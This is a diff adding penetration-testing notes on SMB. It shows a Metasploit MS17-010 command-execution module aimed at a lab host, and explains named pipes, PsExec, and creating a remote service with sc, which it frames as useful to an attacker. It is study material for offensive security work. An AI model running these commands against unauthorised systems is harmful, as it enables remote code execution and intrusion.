@@ -8,6 +8,45 @@ A list to clarify SMB version numbers, and their related Windows OS versions:
 - SMB2.1 – Windows 7 and Windows 2008 R2 
 - SMB3 – Windows 8 and Windows 2012
 
+---
+
+SMB Named Pipe MS017-010:
+
+```bash
+msf > use auxiliary/admin/smb/ms17_010_command
+msf > setg RHOSTS 10.11.1.75
+msf > set COMMAND ipconfig
+msf > exploit
+```
+
+### Named Pipe
+
+A way that processes communicate with each other via SMB (TCP 445).
+Operates on Layer 5 of the OSI model.
+Similar to how a port can listen for connections, a named pipe can also listen for requests.
+
+### PsExec
+
+`PsExec` comes from Microsoft’s Sysinternals suite and allows users to execute Powershell on remote hosts over port `445` (SMB) using named pipes.
+It first connects to the ADMIN$ share on the target, over SMB, uploads `PSEXESVC.exe` and uses `Service Control Manager` to start the `.exe` which creates a named pipe on the remote system, and finally uses that pipe for I/O.
+
+An example of the syntax is the following:
+
+```bash
+psexec \\test.domain -u Domain\User -p Password ipconfig
+SC
+Service Controller is exactly what it sounds like — it controls services.
+This is particularly useful as an attacker because scheduling tasks is possible over SMB, so the syntax for starting a remote service is:
+sc \\host.domain create ExampleService binpath= “c:\windows\system32\calc.exe”
+sc \\host.domain start ExampleService
+```
+
+The only caveat to this is that the executable must  be specifically a service binary.
+Service binaries are different in the sense that they must "check in" to the service control manager (SCM) and if it doesn't, it will exit execution.
+So if a non-service binary is used for this, it will come back as an agent/beacon for a second, then die.
+
+---
+
 ### Scanning a network with Nbtscan 
 
 ```bash
